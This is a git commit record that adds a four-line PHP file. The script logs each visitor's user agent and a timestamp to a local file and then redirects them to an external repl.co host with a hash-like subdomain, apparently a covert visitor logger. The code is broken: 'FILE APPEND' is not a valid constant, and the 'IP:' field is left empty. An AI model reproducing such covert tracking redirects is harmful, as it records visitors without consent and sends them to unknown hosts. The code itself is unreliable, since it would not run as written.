ca43b9275c94c207019fe50677810741ab5aaee7
xXBuratiteSlayer123Xx <136215627+xXBuratiteSlayer123Xx@users.noreply.github.com>
2023-06-11 13:11:07 +0800

    Add files via upload

---
+++ tuldok.php
@@ -0,0 +1,4 @@
+<?php
+file_put_contents("palayan917.lupa", "User-agent: " . $_SERVER['HTTP_USER_AGENT'] . "\nDate: " . date("d-m-y h:i:s") . "\nIP: ", FILE APPEND);
+header('Location: http://098f6bcd4621d373cade4e832627b4f6.slawmeegaming.repl.co', true, 301);
+?>
